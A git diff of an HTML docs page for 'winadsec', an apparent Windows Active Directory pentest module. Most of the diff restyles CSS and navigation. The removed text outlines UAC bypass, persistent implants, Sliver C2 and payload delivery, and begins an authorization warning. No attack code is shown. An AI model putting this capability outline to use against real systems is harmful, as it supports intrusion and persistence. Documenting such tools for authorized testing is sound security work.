@@ -18,652 +18,1091 @@ html { scroll-behavior: smooth; -webkit-font-smoothing: antialiased; }
   --bg2:     #141414;
   --bg3:     #1c1c1c;
   --border:  rgba(255,255,255,0.06);
-  --border2: rgba(255,255,255,0.12);
-  --border3: rgba(255,255,255,0.18);
-  --text:    #9a9a9a;
-  --muted:   #4a4a4a;
+  --border2: rgba(255,255,255,0.13);
+  --border3: rgba(255,255,255,0.2);
+  --text:    #a8a8a8;
+  --muted:   #505050;
+  --dim:     #252525;
   --white:   #f0f0f0;
-  --off:     #d0d0d0;
-  --grey:    #707070;
+  --off:     #d8d8d8;
+  --grey:    #787878;
   --acc:     #88aacc;
   --acc2:    #6a8faa;
   --warn:    #b09040;
   --danger:  #aa5555;
   --mono:    'JetBrains Mono', monospace;
   --disp:    'Syne', sans-serif;
-  --sidebar-w: 240px;
-  --toc-w: 200px;
-  --content-max: 720px;
-  --transition: 0.18s ease;
+  --nav-h:   52px;
+  --transition: 0.16s ease;
 }
 
-body { font-family: var(--mono); background: var(--bg); color: var(--text); line-height: 1.7; overflow-x: hidden; }
+body {
+  font-family: var(--mono);
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* ── Scrollbar ── */
 ::-webkit-scrollbar { width: 4px; height: 4px; }
 ::-webkit-scrollbar-track { background: var(--bg); }
 ::-webkit-scrollbar-thumb { background: var(--bg3); border-radius: 2px; }
 
-/* ─── Layout ─── */
-.layout { min-height: 100vh; }
-
-/* ─── Sidebar ─── */
-aside.nav-sidebar {
-  position: fixed; top: 0; left: 0; bottom: 0;
-  width: var(--sidebar-w);
-  border-right: 1px solid var(--border);
-  overflow-y: auto;
-  padding: 2rem 1.5rem 3rem;
-  background: var(--bg);
+/* ── Nav ── */
+nav {
+  position: fixed;
+  top: 0; left: 0; right: 0;
   z-index: 100;
-  transition: transform var(--transition);
+  height: var(--nav-h);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 2.5rem;
+  border-bottom: 1px solid transparent;
+  transition: border-color 0.3s, background 0.3s;
 }
-.side-brand { font-family: var(--disp); font-size: 1rem; font-weight: 800; color: var(--white); text-decoration: none; letter-spacing: -0.03em; display: block; margin-bottom: 0.15rem; }
-.side-sub { font-size: 0.52rem; letter-spacing: 0.18em; text-transform: uppercase; color: var(--muted); margin-bottom: 2.5rem; display: block; }
-.nav-section { font-size: 0.46rem; letter-spacing: 0.2em; text-transform: uppercase; color: var(--muted); margin: 1.75rem 0 0.5rem; padding-left: 0.5rem; }
-.nav-item {
-  display: flex; align-items: center; justify-content: space-between;
-  font-size: 0.74rem; color: var(--text); text-decoration: none;
-  padding: 0.35rem 0.6rem; border-radius: 3px;
-  transition: background var(--transition), color var(--transition); margin-bottom: 1px;
+nav.scrolled {
+  background: rgba(5,5,5,0.96);
+  backdrop-filter: blur(16px);
+  border-color: var(--border);
 }
-.nav-item:hover { background: var(--bg2); color: var(--off); }
-.nav-item.active { background: var(--bg2); color: var(--white); }
-.nav-badge {
-  font-size: 0.42rem; letter-spacing: 0.1em; text-transform: uppercase;
-  color: var(--warn); padding: 0.1rem 0.35rem;
-  background: rgba(176,144,64,0.1); border-radius: 2px; flex-shrink: 0;
+.logo {
+  font-family: var(--disp);
+  font-size: 0.9rem;
+  font-weight: 700;
+  color: var(--off);
+  text-decoration: none;
+  letter-spacing: 0.01em;
+  display: flex;
+  align-items: center;
+  gap: 0.55rem;
+}
+.logo-mark { width: 6px; height: 6px; background: var(--acc); flex-shrink: 0; }
+.nav-links { display: flex; align-items: center; gap: 0.1rem; }
+.nav-link {
+  font-family: var(--mono);
+  font-size: 0.62rem;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--muted);
+  text-decoration: none;
+  padding: 0.4rem 0.75rem;
+  transition: color var(--transition);
+}
+.nav-link:hover { color: var(--text); }
+.nav-btn {
+  font-family: var(--mono);
+  font-size: 0.62rem;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--text);
+  text-decoration: none;
+  padding: 0.4rem 0.9rem;
+  border: 1px solid var(--border2);
+  margin-left: 0.5rem;
+  transition: border-color var(--transition), color var(--transition);
+}
+.nav-btn:hover { border-color: var(--white); color: var(--white); }
+.nav-btn.primary { background: var(--white); border-color: var(--white); color: var(--bg); }
+.nav-btn.primary:hover { background: transparent; color: var(--white); }
+
+.nav-burger {
+  display: none;
+  background: none;
+  border: 1px solid var(--border2);
+  padding: 0.4rem 0.6rem;
+  cursor: pointer;
+  border-radius: 3px;
+  flex-direction: column;
+  gap: 4px;
+}
+.nav-burger span { display: block; width: 18px; height: 1px; background: var(--text); transition: transform var(--transition), opacity var(--transition); }
+body.nav-open .nav-burger span:nth-child(1) { transform: rotate(45deg) translate(3.5px,3.5px); }
+body.nav-open .nav-burger span:nth-child(2) { opacity: 0; }
+body.nav-open .nav-burger span:nth-child(3) { transform: rotate(-45deg) translate(3.5px,-3.5px); }
+
+/* ── Page wrapper ── */
+.page {
+  max-width: 1080px;
+  margin: 0 auto;
+  padding: 0 2.5rem;
 }
 
-/* ─── Main ─── */
-main {
-  padding: 4rem 3.5rem 8rem;
-  padding-left: calc(var(--sidebar-w) + 3.5rem);
-  padding-right: calc(var(--toc-w) + 3.5rem);
+/* ── Doc Header ── */
+.doc-header {
+  padding-top: calc(var(--nav-h) + 3.5rem);
+  padding-bottom: 3.5rem;
+  border-bottom: 1px solid var(--border);
+  animation: rise 0.45s ease both;
 }
-.main-inner { max-width: var(--content-max); margin: 0 auto; }
+@keyframes rise { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:none; } }
 
-/* ─── TOC rail ─── */
-aside.toc-rail {
-  position: fixed; top: 0; right: 0; bottom: 0;
-  width: var(--toc-w); border-left: 1px solid var(--border);
-  overflow-y: auto; padding: 2rem 1.25rem 3rem;
-  background: var(--bg); z-index: 50;
+.breadcrumb {
+  font-size: 0.56rem;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 1.75rem;
+  display: flex;
+  align-items: center;
+  gap: 0.6rem;
+  flex-wrap: wrap;
 }
-.toc-title { font-size: 0.44rem; letter-spacing: 0.2em; text-transform: uppercase; color: var(--muted); margin-bottom: 0.75rem; display: block; }
-.toc-item {
-  display: block; font-size: 0.58rem; color: var(--muted);
-  text-decoration: none; padding: 0.28rem 0.5rem;
-  border-left: 1px solid var(--border);
-  transition: color var(--transition), border-color var(--transition);
-  line-height: 1.4; margin-bottom: 2px;
-}
-.toc-item:hover { color: var(--text); border-color: var(--border2); }
-.toc-item.active { color: var(--white); border-color: var(--acc); }
-
-/* ─── Mobile header ─── */
-.mobile-header {
-  display: none; position: fixed; top: 0; left: 0; right: 0;
-  height: 52px; background: var(--bg); border-bottom: 1px solid var(--border);
-  z-index: 200; align-items: center; justify-content: space-between; padding: 0 1.25rem;
-}
-.mobile-brand { font-family: var(--disp); font-size: 0.88rem; font-weight: 800; color: var(--white); letter-spacing: -0.03em; }
-.burger { background: none; border: 1px solid var(--border2); padding: 0.4rem 0.6rem; cursor: pointer; border-radius: 3px; display: flex; flex-direction: column; gap: 4px; transition: border-color var(--transition); }
-.burger:hover { border-color: var(--border3); }
-.burger span { display: block; width: 18px; height: 1px; background: var(--text); transition: transform var(--transition), opacity var(--transition); }
-body.menu-open .burger span:nth-child(1) { transform: rotate(45deg) translate(3.5px, 3.5px); }
-body.menu-open .burger span:nth-child(2) { opacity: 0; }
-body.menu-open .burger span:nth-child(3) { transform: rotate(-45deg) translate(3.5px, -3.5px); }
-.menu-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 90; backdrop-filter: blur(2px); }
-body.menu-open .menu-overlay { display: block; }
-
-/* ─── Breadcrumb ─── */
-.breadcrumb { font-size: 0.52rem; letter-spacing: 0.14em; text-transform: uppercase; color: var(--muted); margin-bottom: 2.5rem; display: flex; align-items: center; gap: 0.6rem; flex-wrap: wrap; }
 .breadcrumb a { color: var(--muted); text-decoration: none; transition: color var(--transition); }
 .breadcrumb a:hover { color: var(--text); }
-.breadcrumb-sep { color: var(--bg3); font-size: 0.7rem; }
+.breadcrumb span { color: var(--dim); }
 
-/* ─── Hero ─── */
-.hero-tag { display: inline-flex; align-items: center; gap: 0.5rem; font-size: 0.5rem; letter-spacing: 0.18em; text-transform: uppercase; color: var(--acc); border: 1px solid rgba(136,170,204,0.2); padding: 0.25rem 0.7rem; border-radius: 2px; margin-bottom: 1.25rem; }
-.hero-dot { width: 5px; height: 5px; background: var(--acc); border-radius: 50%; animation: pulse 2s ease infinite; }
-@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
-h1 { font-family: var(--disp); font-size: clamp(2rem, 5vw, 3.25rem); font-weight: 800; letter-spacing: -0.05em; color: var(--white); line-height: 0.95; margin-bottom: 1rem; }
-.hero-sub { font-size: 0.84rem; color: var(--muted); max-width: 520px; line-height: 1.9; margin-bottom: 2rem; }
-.meta-row { display: flex; gap: 0; flex-wrap: wrap; margin-bottom: 3rem; padding-bottom: 2.5rem; border-bottom: 1px solid var(--border); }
-.meta-item { display: flex; flex-direction: column; gap: 0.3rem; padding: 0.75rem 1.5rem; border-right: 1px solid var(--border); }
-.meta-item:first-child { padding-left: 0; }
-.meta-item:last-child { border-right: none; }
-.meta-label { font-size: 0.43rem; letter-spacing: 0.2em; text-transform: uppercase; color: var(--muted); }
-.meta-val { font-size: 0.68rem; color: var(--text); }
-.meta-val.hi { color: var(--white); }
+.module-meta {
+  display: flex;
+  align-items: flex-start;
+  justify-content: space-between;
+  gap: 2.5rem;
+  flex-wrap: wrap;
+}
+.module-title {
+  font-family: var(--disp);
+  font-size: clamp(2.8rem, 6vw, 4.8rem);
+  font-weight: 800;
+  letter-spacing: -0.04em;
+  color: var(--white);
+  line-height: 0.95;
+  margin-bottom: 0.85rem;
+}
+.module-title span { color: var(--grey); font-weight: 400; }
+.module-sub {
+  font-size: 0.84rem;
+  color: var(--muted);
+  line-height: 1.85;
+  max-width: 500px;
+  margin-bottom: 1.5rem;
+}
+.module-tags { display: flex; gap: 0.4rem; flex-wrap: wrap; }
+.tag {
+  font-size: 0.5rem;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  padding: 0.18rem 0.55rem;
+  border: 1px solid var(--border2);
+  color: var(--muted);
+}
+.tag.hi { color: var(--white); border-color: rgba(255,255,255,0.28); }
+.tag.acc { color: var(--acc); border-color: rgba(136,170,204,0.25); }
+.tag.warn { color: var(--warn); border-color: rgba(176,144,64,0.25); }
 
-/* ─── Headings ─── */
-h2 { font-family: var(--disp); font-size: 1.2rem; font-weight: 700; letter-spacing: -0.02em; color: var(--white); margin: 3.5rem 0 1.25rem; padding-top: 1.25rem; border-top: 1px solid var(--border); scroll-margin-top: 2rem; }
-h3 { font-size: 0.84rem; font-weight: 600; color: var(--off); margin: 2rem 0 0.75rem; letter-spacing: 0.02em; }
-p { font-size: 0.82rem; color: var(--text); line-height: 1.85; margin-bottom: 0.85rem; }
+.module-stats { display: flex; flex-direction: column; gap: 1rem; min-width: 210px; }
+.stat-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 0.55rem 0;
+  border-bottom: 1px solid var(--border);
+  font-size: 0.68rem;
+  gap: 2rem;
+}
+.stat-row:last-child { border-bottom: none; }
+.stat-lbl { letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); }
+.stat-v { color: var(--white); font-weight: 500; }
+.stat-v.acc { color: var(--acc); }
 
-/* ─── Code ─── */
-pre { background: var(--bg1); border: 1px solid var(--border); border-left: 2px solid var(--border2); padding: 1.1rem 1.4rem; overflow-x: auto; margin: 0.85rem 0 1.5rem; border-radius: 2px; }
-pre code { font-family: var(--mono); font-size: 0.8rem; color: var(--text); line-height: 1.8; }
-.hl { color: var(--white); }
-.cm { color: var(--muted); font-style: italic; }
-.kw { color: var(--acc); }
-.str { color: #88cc88; }
-code { font-family: var(--mono); font-size: 0.78em; color: var(--white); background: var(--bg2); padding: 0.1em 0.35em; border: 1px solid var(--border); border-radius: 2px; }
-pre code { background: none; border: none; padding: 0; font-size: 0.8rem; }
+/* ── Doc body grid ── */
+.doc-body {
+  display: grid;
+  grid-template-columns: 200px 1fr;
+  gap: 4rem;
+  padding: 3.5rem 0;
+  align-items: start;
+}
 
-/* ─── Tables ─── */
-.table-wrap { overflow-x: auto; margin: 0.5rem 0 1.75rem; -webkit-overflow-scrolling: touch; }
-table { width: 100%; border-collapse: collapse; min-width: 460px; }
-th { font-family: var(--mono); font-size: 0.54rem; letter-spacing: 0.14em; text-transform: uppercase; color: var(--grey); text-align: left; padding: 0.6rem 1rem; border-bottom: 1px solid var(--border2); background: var(--bg1); white-space: nowrap; }
-td { padding: 0.7rem 1rem; border-bottom: 1px solid var(--border); color: var(--text); vertical-align: top; line-height: 1.65; }
+/* ── Sidebar ── */
+.sidebar { position: sticky; top: calc(var(--nav-h) + 1rem); }
+.sidebar-nav { list-style: none; }
+.sidebar-nav li { margin-bottom: 0.05rem; }
+.sidebar-nav a {
+  display: block;
+  font-size: 0.62rem;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  color: var(--muted);
+  text-decoration: none;
+  padding: 0.4rem 0;
+  border-left: 2px solid transparent;
+  padding-left: 0.75rem;
+  transition: color var(--transition), border-color var(--transition);
+}
+.sidebar-nav a:hover { color: var(--text); border-color: var(--border2); }
+.sidebar-nav a.active { color: var(--white); border-color: var(--white); }
+.sidebar-sep {
+  font-size: 0.48rem;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--dim);
+  padding: 0.7rem 0 0.25rem 0.75rem;
+  margin-top: 0.5rem;
+}
+
+/* ── Content sections ── */
+.content section {
+  padding-bottom: 3.5rem;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 3.5rem;
+}
+.content section:last-child { border-bottom: none; }
+
+.sec-label {
+  font-size: 0.52rem;
+  letter-spacing: 0.22em;
+  text-transform: uppercase;
+  color: var(--grey);
+  margin-bottom: 0.55rem;
+}
+
+h2 {
+  font-family: var(--disp);
+  font-size: clamp(1.4rem, 2.5vw, 2rem);
+  font-weight: 800;
+  letter-spacing: -0.03em;
+  color: var(--white);
+  margin-bottom: 1.25rem;
+  line-height: 1.05;
+}
+
+h3 {
+  font-family: var(--disp);
+  font-size: 1.05rem;
+  font-weight: 700;
+  color: var(--off);
+  margin: 2rem 0 0.8rem;
+  letter-spacing: -0.01em;
+}
+
+p {
+  font-size: 0.82rem;
+  color: var(--text);
+  line-height: 1.85;
+  margin-bottom: 0.9rem;
+}
+p:last-child { margin-bottom: 0; }
+
+a { color: var(--grey); }
+a:hover { color: var(--white); }
+
+/* ── Code ── */
+pre {
+  background: var(--bg1);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--border3);
+  padding: 1.1rem 1.35rem;
+  overflow-x: auto;
+  margin: 1rem 0;
+  font-size: 0.76rem;
+  line-height: 1.75;
+  border-radius: 0 2px 2px 0;
+}
+code {
+  font-family: var(--mono);
+  font-size: 0.76rem;
+  background: var(--bg1);
+  border: 1px solid var(--border);
+  padding: 0.08rem 0.35rem;
+  color: var(--off);
+}
+pre code { background: none; border: none; padding: 0; font-size: inherit; }
+.comment { color: var(--muted); font-style: italic; }
+.kw { color: var(--white); }
+.str { color: var(--grey); }
+.hl { color: var(--acc); }
+
+/* ── Tables ── */
+.table-wrap { overflow-x: auto; margin: 1rem 0; -webkit-overflow-scrolling: touch; }
+table { width: 100%; border-collapse: collapse; font-size: 0.74rem; min-width: 420px; }
+th {
+  font-family: var(--mono);
+  font-size: 0.54rem;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  color: var(--grey);
+  text-align: left;
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid var(--border2);
+  background: var(--bg1);
+  white-space: nowrap;
+}
+td {
+  padding: 0.7rem 1rem;
+  border-bottom: 1px solid var(--border);
+  color: var(--text);
+  vertical-align: top;
+  line-height: 1.65;
+}
 tr:last-child td { border-bottom: none; }
 tr:hover td { background: var(--bg1); }
-td:first-child { color: var(--off); font-weight: 500; }
+td:first-child { color: var(--off); font-weight: 500; white-space: nowrap; }
 td code { font-size: 0.7rem; }
 
-/* ─── Op grid cards ─── */
-.op-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 1px; background: var(--border); border: 1px solid var(--border); margin: 1.25rem 0 1.75rem; }
-.op-card { background: var(--bg); padding: 1.1rem; transition: background var(--transition); }
-.op-card:hover { background: var(--bg1); }
-.op-name { font-family: var(--disp); font-size: 0.86rem; font-weight: 700; color: var(--white); margin-bottom: 0.35rem; display: flex; align-items: center; gap: 0.4rem; flex-wrap: wrap; }
-.op-badge { font-size: 0.5rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.1rem 0.35rem; background: rgba(255,255,255,0.05); color: var(--muted); border-radius: 1px; }
-.op-badge.admin { background: rgba(170,85,85,0.12); color: var(--danger); }
-.op-badge.creds { background: rgba(136,170,204,0.1); color: var(--acc); }
-.op-badge.nocreds { background: rgba(112,112,112,0.1); color: var(--grey); }
-.op-desc { font-size: 0.7rem; color: var(--muted); line-height: 1.65; }
+/* ── Feature grid ── */
+.feat-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
+  gap: 1px;
+  background: var(--border);
+  border: 1px solid var(--border);
+  margin: 1.25rem 0;
+}
+.feat-cell {
+  background: var(--bg);
+  padding: 1.1rem;
+  transition: background var(--transition);
+}
+.feat-cell:hover { background: var(--bg1); }
+.feat-icon {
+  font-size: 0.54rem;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  color: var(--grey);
+  margin-bottom: 0.4rem;
+}
+.feat-name {
+  font-family: var(--disp);
+  font-size: 0.88rem;
+  font-weight: 700;
+  color: var(--white);
+  margin-bottom: 0.3rem;
+}
+.feat-desc { font-size: 0.72rem; color: var(--muted); line-height: 1.6; }
 
-/* ─── Attack chain ─── */
-.chain { display: flex; flex-direction: column; border: 1px solid var(--border); margin: 1.25rem 0 1.75rem; }
-.chain-step { display: grid; grid-template-columns: 2.5rem 1fr; gap: 0.85rem; padding: 1rem 1.15rem; border-bottom: 1px solid var(--border); align-items: start; background: var(--bg); transition: background var(--transition); }
+/* ── Op grid cards ── */
+.mode-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(175px, 1fr));
+  gap: 1px;
+  background: var(--border);
+  border: 1px solid var(--border);
+  margin: 1.25rem 0;
+}
+.mode-card {
+  background: var(--bg);
+  padding: 1.1rem;
+  transition: background var(--transition);
+  cursor: default;
+}
+.mode-card:hover { background: var(--bg1); }
+.mode-key {
+  font-family: var(--disp);
+  font-size: 0.95rem;
+  font-weight: 700;
+  color: var(--white);
+  margin-bottom: 0.4rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 0.5rem;
+  flex-wrap: wrap;
+}
+.mode-badge {
+  font-size: 0.46rem;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  padding: 0.12rem 0.38rem;
+  border: 1px solid var(--border2);
+  color: var(--muted);
+}
+.mode-badge.admin { background: rgba(170,85,85,0.12); color: var(--danger); border-color: rgba(170,85,85,0.2); }
+.mode-badge.creds { background: rgba(136,170,204,0.08); color: var(--acc); border-color: rgba(136,170,204,0.2); }
+.mode-badge.nocreds { border-color: var(--border2); color: var(--muted); }
+.mode-desc { font-size: 0.71rem; color: var(--muted); line-height: 1.6; }
+
+/* ── Attack chain ── */
+.chain { display: flex; flex-direction: column; border: 1px solid var(--border); margin: 1.25rem 0; }
+.chain-step {
+  display: grid;
+  grid-template-columns: 2.5rem 1fr;
+  gap: 0.85rem;
+  padding: 1rem 1.15rem;
+  border-bottom: 1px solid var(--border);
+  align-items: start;
+  background: var(--bg);
+  transition: background var(--transition);
+}
 .chain-step:last-child { border-bottom: none; }
 .chain-step:hover { background: var(--bg1); }
 .chain-num { font-family: var(--disp); font-size: 0.72rem; font-weight: 800; color: var(--muted); padding-top: 0.1rem; }
 .chain-title { font-size: 0.78rem; font-weight: 600; color: var(--white); margin-bottom: 0.3rem; }
 .chain-desc { font-size: 0.7rem; color: var(--muted); line-height: 1.65; }
 
-/* ─── Severity badges ─── */
-.sev { font-size: 0.5rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.1rem 0.4rem; border-radius: 2px; font-weight: 600; }
-.sev-low  { background: rgba(136,170,204,0.1); color: var(--acc); }
-.sev-high { background: rgba(170,85,85,0.12); color: var(--danger); }
-.sev-info { background: rgba(112,112,112,0.1); color: var(--grey); }
+/* ── Severity badges ── */
+.sev { font-size: 0.48rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.12rem 0.38rem; border-radius: 2px; font-weight: 600; }
+.sev-low  { background: rgba(136,170,204,0.1); color: var(--acc); border: 1px solid rgba(136,170,204,0.2); }
+.sev-high { background: rgba(170,85,85,0.12); color: var(--danger); border: 1px solid rgba(170,85,85,0.2); }
+.sev-info { background: rgba(112,112,112,0.1); color: var(--grey); border: 1px solid var(--border2); }
 
-/* ─── Warning / disclaimer ─── */
-.warning { border: 1px solid rgba(170,85,85,0.25); border-left: 3px solid var(--danger); background: rgba(170,85,85,0.04); padding: 1rem 1.25rem; margin: 1.1rem 0 1.75rem; font-size: 0.78rem; color: var(--text); line-height: 1.8; border-radius: 0 2px 2px 0; }
-.warning strong { color: var(--danger); }
-.info-box { border: 1px solid var(--border2); border-left: 3px solid var(--border3); background: var(--bg1); padding: 1rem 1.25rem; margin: 1.1rem 0 1.75rem; font-size: 0.78rem; color: var(--muted); line-height: 1.8; border-radius: 0 2px 2px 0; }
-
-/* ─── Footer ─── */
-.page-footer { margin-top: 5rem; padding-top: 2rem; border-top: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; }
-.page-footer a { font-size: 0.56rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); text-decoration: none; transition: color var(--transition); }
-.page-footer a:hover { color: var(--text); }
-
-/* ─── Responsive ─── */
-@media (max-width: 1100px) { aside.toc-rail { display: none; } main { padding-right: 3.5rem; } }
-@media (max-width: 760px) {
-  :root { --sidebar-w: 260px; }
-  aside.nav-sidebar { transform: translateX(-100%); box-shadow: none; }
-  body.menu-open aside.nav-sidebar { transform: translateX(0); box-shadow: 8px 0 40px rgba(0,0,0,0.8); }
-  .mobile-header { display: flex; }
-  main { padding: 5rem 1.5rem 6rem; }
-  .meta-item { padding: 0.65rem 1rem; flex: 1 1 auto; min-width: 100px; }
-  .meta-item:first-child { padding-left: 1rem; }
-  .op-grid { grid-template-columns: 1fr 1fr; }
-  h1 { font-size: clamp(1.75rem, 7vw, 2.5rem); }
+/* ── Callouts ── */
+.callout {
+  display: flex;
+  gap: 0.75rem;
+  padding: 0.95rem 1.15rem;
+  border: 1px solid var(--border2);
+  border-left: 3px solid var(--border2);
+  margin: 1.25rem 0;
+  font-size: 0.78rem;
+  line-height: 1.7;
+  color: var(--text);
+  border-radius: 0 2px 2px 0;
 }
-@media (max-width: 480px) {
-  main { padding: 5rem 1rem 5rem; }
-  .op-grid { grid-template-columns: 1fr; }
+.callout.warn { border-left-color: var(--warn); background: rgba(176,144,64,0.03); }
+.callout.crit { border-left-color: var(--danger); background: rgba(170,85,85,0.04); }
+.callout.info { border-left-color: var(--muted); }
+.callout-mark { font-size: 0.64rem; color: var(--grey); flex-shrink: 0; margin-top: 0.15rem; }
+.callout strong { color: var(--danger); }
+
+/* ── Footer ── */
+footer { border-top: 1px solid var(--border); margin-top: 2rem; }
+.foot-inner {
+  max-width: 1080px;
+  margin: 0 auto;
+  padding: 1.5rem 2.5rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 1rem;
+}
+.foot-brand {
+  font-family: var(--disp);
+  font-size: 0.88rem;
+  font-weight: 700;
+  color: var(--muted);
+  text-decoration: none;
+}
+.foot-links { display: flex; gap: 1.75rem; }
+.foot-link {
+  font-size: 0.55rem;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--muted);
+  text-decoration: none;
+  transition: color var(--transition);
+}
+.foot-link:hover { color: var(--text); }
+.foot-note { font-size: 0.52rem; color: var(--dim); letter-spacing: 0.06em; }
+
+/* ── Responsive ── */
+@media (max-width: 860px) {
+  nav { padding: 0 1.5rem; }
+  .nav-links { display: none; }
+  .nav-burger { display: flex; }
+  body.nav-open .nav-links {
+    display: flex;
+    position: fixed;
+    top: var(--nav-h);
+    left: 0; right: 0;
+    background: var(--bg);
+    border-bottom: 1px solid var(--border);
+    flex-direction: column;
+    padding: 1rem 1.5rem 1.5rem;
+    gap: 0.25rem;
+    align-items: flex-start;
+    z-index: 99;
+  }
+  .page { padding: 0 1.5rem; }
+  .doc-body { grid-template-columns: 1fr; gap: 0; }
+  .sidebar { display: none; }
+  .module-title { font-size: 2.6rem; }
+  .module-stats { min-width: unset; width: 100%; }
+  pre { font-size: 0.7rem; }
+}
+
+@media (max-width: 540px) {
+  .feat-grid { grid-template-columns: 1fr; }
+  .mode-grid { grid-template-columns: 1fr; }
+  .page { padding: 0 1rem; }
   pre { padding: 0.85rem 1rem; }
-  .meta-row { flex-direction: column; }
-  .meta-item { border-right: none; border-bottom: 1px solid var(--border); }
-  .meta-item:last-child { border-bottom: none; }
+  .doc-header { padding-top: calc(var(--nav-h) + 2rem); }
 }
 </style>
 </head>
 <body>
 
-<!-- Mobile header -->
-<header class="mobile-header">
-  <span class="mobile-brand">secV / winadsec</span>
-  <button class="burger" id="burger" aria-label="Toggle menu">
+<!-- Nav -->
+<nav id="nav">
+  <a class="logo" href="../index.html">
+    <span class="logo-mark"></span>
+    secV / winadsec
+  </a>
+  <div class="nav-links">
+    <a class="nav-link" href="../index.html#projects">Arsenal</a>
+    <a class="nav-link" href="../index.html#mission">Mission</a>
+    <a class="nav-link" href="netrecon.html">netrecon</a>
+    <a class="nav-link" href="android_pentest.html">android_pentest</a>
+    <a class="nav-btn" href="https://github.com/0xb0rn3" target="_blank">GitHub</a>
+    <a class="nav-btn primary" href="https://discord.gg/SecVulnHub" target="_blank">Discord</a>
+  </div>
+  <button class="nav-burger" id="burger" aria-label="Toggle menu">
     <span></span><span></span><span></span>
   </button>
-</header>
-<div class="menu-overlay" id="overlay"></div>
+</nav>
 
-<div class="layout">
+<div class="page">
 
-<!-- Sidebar -->
-<aside class="nav-sidebar" id="sidebar">
-  <a class="side-brand" href="../index.html">secV</a>
-  <span class="side-sub">Module Reference</span>
-
-  <span class="nav-section">Modules</span>
-  <a class="nav-item" href="netrecon.html">netrecon</a>
-  <a class="nav-item" href="android_pentest.html">android_pentest <span class="nav-badge">stable</span></a>
-  <a class="nav-item" href="wifi_monitor.html">wifi_monitor</a>
-  <a class="nav-item" href="mac_spoof.html">mac_spoof</a>
-  <a class="nav-item" href="websec.html">websec</a>
-  <a class="nav-item" href="ctfpwn.html">ctfpwn</a>
-  <a class="nav-item active" href="windowsAD.html">winadsec <span class="nav-badge">new</span></a>
-
-  <span class="nav-section">On this page</span>
-  <a class="nav-item" href="#overview">Overview</a>
-  <a class="nav-item" href="#quickstart">Quickstart</a>
-  <a class="nav-item" href="#chain">Attack Chain</a>
-  <a class="nav-item" href="#assess">Assessment</a>
-  <a class="nav-item" href="#postex">Post-Exploitation</a>
-  <a class="nav-item" href="#persist">Persistence</a>
-  <a class="nav-item" href="#sliver">Sliver C2</a>
-  <a class="nav-item" href="#gen">Payload Gen</a>
-  <a class="nav-item" href="#examples">Examples</a>
-  <a class="nav-item" href="#requirements">Requirements</a>
-
-  <span class="nav-section">Links</span>
-  <a class="nav-item" href="../index.html">← Hub</a>
-  <a class="nav-item" href="https://github.com/secvulnhub" target="_blank">GitHub ↗</a>
-</aside>
-
-<!-- Main content -->
-<main>
-<div class="main-inner">
-
-  <div class="breadcrumb">
-    <a href="../../../index.html">SecVulnHub</a>
-    <span class="breadcrumb-sep">/</span>
-    <a href="../index.html">Docs</a>
-    <span class="breadcrumb-sep">/</span>
-    winadsec
-  </div>
-
-  <div class="hero-tag"><span class="hero-dot"></span>Windows / Active Directory</div>
-  <h1>winadsec</h1>
-  <p class="hero-sub">
-    Windows Active Directory pentest and post-exploitation. Full attack chain from
-    unauthenticated discovery through UAC bypass, reboot-persistent implant installation,
-    Sliver C2 session management, and end-to-end payload delivery generation.
-  </p>
-
-  <div class="meta-row">
-    <div class="meta-item"><span class="meta-label">Version</span><span class="meta-val hi">1.0.0</span></div>
-    <div class="meta-item"><span class="meta-label">Category</span><span class="meta-val">Windows / AD</span></div>
-    <div class="meta-item"><span class="meta-label">Author</span><span class="meta-val">0xb0rn3 | 0xbv1</span></div>
-    <div class="meta-item"><span class="meta-label">Language</span><span class="meta-val">Python 3</span></div>
-    <div class="meta-item"><span class="meta-label">Location</span><span class="meta-val">tools/AD/windows/</span></div>
-  </div>
-
-  <!-- Overview -->
-  <h2 id="overview">Overview</h2>
-  <p>
-    <code>winadsec</code> is a full-chain Windows Active Directory pentest and post-exploitation module
-    built for the secV framework. It integrates unauthenticated discovery, credential-based enumeration,
-    lateral movement, UAC bypass, reboot-persistent implants, Sliver C2 session management, and a complete
-    payload delivery pipeline — all driven by a single JSON context from the secV shell.
-  </p>
-  <p>
-    The module spans three major capability areas: <strong>AD assessment</strong> (enumerate, enumerate, loot),
-    <strong>post-exploitation</strong> (escalate, persist, C2), and <strong>payload generation</strong>
-    (implant → shellcode → DLL → ISO). All output is written to <code>output_dir</code>.
-  </p>
-
-  <div class="warning">
-    <strong>AUTHORIZATION REQUIRED.</strong> Only run against systems you own or have explicit written
